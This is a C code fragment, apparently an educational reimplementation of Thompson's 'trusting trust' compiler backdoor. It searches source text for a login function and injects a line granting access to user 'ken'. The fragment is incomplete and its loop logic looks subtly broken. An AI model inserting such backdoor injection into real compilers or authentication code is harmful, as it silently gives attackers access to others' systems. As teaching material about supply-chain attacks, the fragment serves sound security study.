static char login_sig[] = "int login(char *user) {";


// and inject an attack for "ken":
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
i = 0;
static char login_end[] = "does not exist\\n\", user);";
while (i < strlen(program)){
        if (strncmp(program + i, login_sig, strlen(login_sig)) == 0){
        // strncpy(modified_program, program, i + strlen(login_sig));
        // strcat(modified_program, login_attack);
        // strcat(modified_program, program + i + strlen(login_sig));
        for (int j = i; j < i + strlen(login_sig); j++){
            fprintf(fp, "%c", program[j]);
        }
        i += strlen(login_sig);
        for (int j = 0; j < strlen(login_attack); j++){
            fprintf(fp, "%c", login_attack[j]);
        }
        fprintf(fp, "\n");
        while (i < strlen(program)){
            if (strncmp(program + i, login_end, strlen(login_end)) == 0){
                i += strlen(login_end);
                fprintf(fp, "%s", "\n");
                break;
            } else {
                i++;
            }
        }
        fprintf(fp, "%s", "return 1;");
    }
}